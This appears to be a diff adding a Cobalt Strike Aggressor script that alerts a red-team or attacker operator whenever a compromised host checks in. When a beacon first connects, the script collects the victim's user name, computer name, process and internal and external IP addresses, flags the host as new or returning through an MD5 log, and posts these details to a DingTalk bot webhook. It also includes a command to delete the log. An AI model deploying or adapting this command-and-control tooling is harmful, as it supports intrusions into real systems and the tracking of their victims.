@@ -1,0 +1,223 @@
+# reference
+## https://gist.github.com/byt3bl33d3r/10b4db86bc19b849746a60a94d15bc40
+## https://github.com/001SPARTaN/aggressor_scripts/blob/master/http.cna
+
+# USE
+## ./agscript 10.10.10.10 50000 neo 123 Beacon_Online.cna
+
+# Clean
+## run beacon_log_clean in beacon.
+
+import java.net.URLEncoder;
+import java.io.BufferedReader;
+import java.io.DataOutputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+#------------------------config------------------------#
+$beacon_local_initial_config_enable_notify = 1;
+	
+# your Token for DingToken Bot 
+$beacon_local_initial_config_DingToken = "YOUR Token";
+
+$beacon_local_initial_config_logdir = "./logs/beacon_log";
+$beacon_local_initial_config_logfile = "./logs/beacon_log/beacon_initial.log";
+
+#------------------------config------------------------#
+
+
+on beacon_initial {
+	local('$bid');
+	$bid = $1 ;
+	println(getnow());
+	
+	if($beacon_local_initial_config_enable_notify eq 1){
+		Dingtalk($bid);
+	}
+}
+
+
+# ---------------------------------------------------------------------------------------------------------------------------#
+sub getnow {
+	return (formatDate("yyyy/MM/dd HH:mm:ss"));
+}
+
+sub sendhttp{
+    $method = $1;
+    $url = $2;
+    $body = $3 . "\r\n";
+
+    $USER_AGENT = "Mozilla/5.0";
+    $CONTENT_TYPE = "application/json; charset=UTF-8";
+
+    $urlobj = [new URL: $url];
+    
+    $con = [$urlobj openConnection];
+
+    [$con setRequestMethod: $method];
+    [$con setRequestProperty: "User-Agent", $USER_AGENT];
+    [$con setRequestProperty: "Content-Type", $CONTENT_TYPE];
+
+    [$con setDoOutput: true];
+    $wr = [new DataOutputStream: [$con getOutputStream]];
+    [$wr writeBytes: $body];
+    [$wr flush];
+    [$wr close];
+
+    $responseCode = [$con getResponseCode];
+
+    $in = [new BufferedReader: [new InputStreamReader: [$con getInputStream]]];
+
+    $inputLine = "";
+
+    $response = "";
+
+    $inputLine = [$in readLine];
+    $response = $response . $inputLine . "\r\n";
+
+    while ($inputLine ne ""){
+        $inputLine = [$in readLine];
+        $response = $response . $inputLine . "\r\n";
+    }
+
+    [$in close];
+
+    return $response;
+}
+
+# Check if DIR and file exists
+sub Beacon_dir_file{
+	$logdir = $1;
+	$logfile = $2;
+	if (!-exists $logdir)
+	{
+	   mkdir($logdir);
+	   if (checkError($error))
+		{
+			println("Unable to create file: $error");
+			return 0;
+		}
+	}
+
+	sleep(200);
+	if (!-exists $logfile){
+		$handle = openf(">>$logfile");
+		if (checkError($error))
+		{
+			println("Unable to create file: $error");
+			return 0;
+		}
+		closef($handle);
+	}
+
+	#if (-isDir $logdir )
+	#   {
+	#     println(ls($logdir));
+	#   }else{
+	#	println(ls("logs"));
+	#   }
+	
+	  return 1;
+}
+
+#use digest to get MD5 for str 
+sub GetstrMd5{
+	$str = $1;
+	$md5str = unpack("H*", digest($str,"MD5"))[0];
+	return $md5str;
+}
+
+#write md5str if it not in logfile
+sub Writelog{
+	$md5 = $1;
+	println("Writelog: $md5 ");
+	$logfile = $2;
+	$handle = openf(">>$logfile");
+    println($handle,  $md5);
+	closef($handle);
+}
+
+#check md5str if in file 
+sub Readlog{
+	$md5 = $1; 
+	$logfile = $2;
+	if (!-exists $logfile){
+		println("$logfile not exist.")
+		return 0;
+	}
+	$handle = openf("$logfile");
+	println("read file");
+	while $read (readln($handle))
+	{
+		println($read);
+		if($md5 eq $read){
+			closef($handle);
+			return 1;
+		}
+	}
+	closef($handle);
+	return 0;
+}
+
+sub Dingtalk{
+	local('$bid $DingToken $webhook_url $message $internalIP $externalIP $userName $computerName $process $nowtime $md5sum $isnew $logdir $logfile');
+	$bid = $1;
+	$DingToken = $beacon_local_initial_config_DingToken;	
+	$webhook_url = "https://oapi.dingtalk.com/robot/send?access_token=".$DingToken;
+	$isnew = " ";
+	$logdir = $beacon_local_initial_config_logdir;
+	$logfile = $beacon_local_initial_config_logfile;
+	
+	$nowtime = getnow();
+	# 10.10.10.1
+    $internalIP = replace(beacon_info($bid, "internal"), " ", "_");
+	# 8.8.8.8
+    $externalIP = replace(beacon_info($bid, "external"), " ", "_");
+	# Administrator
+    $userName = replace(beacon_info($bid, "user"), " ", "_");
+	# DESTOP-XXXX
+    $computerName = replace(beacon_info($bid, "computer"), " ", "_");
+	# beacon.exe
+    $process = replace(beacon_info($bid, "process"), " ", "_");
+	
+	#Is Old beacon?
+	if(Beacon_dir_file($logdir,$logfile) eq "1"){
+		$md5sum = GetstrMd5($internalIP.$userName.$computerName);
+		println("Beacon md5sum: $md5sum ");
+		if(Readlog($md5sum,$logfile) eq "1"){
+			println("Old beacon");
+			$isnew = "Old";
+		}else{
+			println("NEW beacon");
+			$isnew = "New";
+			Writelog($md5sum,$logfile);
+		}
+	}
+	
+	$message = "{\"msgtype\": \"text\", \"text\": {\"content\": \"Beacon Online( $isnew ):\\nTime:$nowtime\\nUser:$userName\\nProcess:$process\\nInternalIP:$internalIP\\nExternalIP:$externalIP\\nComputer:$computerName\"}}";
+	
+	println($webhook_url);
+	println($message);
+	sendhttp("POST", $webhook_url, $message);
+	println("\n");
+}
+
+alias beacon_log_clean {
+   blog($1, "rm $beacon_local_initial_config_logfile ...");
+   if (!-exists $beacon_local_initial_config_logfile){
+		berror($1, "$beacon_local_initial_config_logfile not exist.")
+		return 0;
+	}else{
+		deleteFile($beacon_local_initial_config_logfile);
+		blog($1, "Done.");
+	}
+}
+
+beacon_command_register(
+   "beacon_log_clean", 
+   "clean beacon log: $beacon_local_initial_config_logfile", 
+   "Help~"
+);
+
+
